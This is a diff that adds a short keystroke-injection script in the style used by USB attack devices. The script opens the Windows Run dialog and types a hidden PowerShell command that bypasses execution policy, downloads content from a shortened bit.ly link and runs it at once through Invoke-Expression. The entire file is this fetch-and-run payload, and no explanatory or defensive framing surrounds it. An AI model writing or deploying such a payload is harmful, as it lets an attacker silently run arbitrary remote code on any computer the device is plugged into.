@@ -1,0 +1,7 @@
+
+REM Clear
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass iwr bit.ly/3WW26Sf | iex
+ENTER
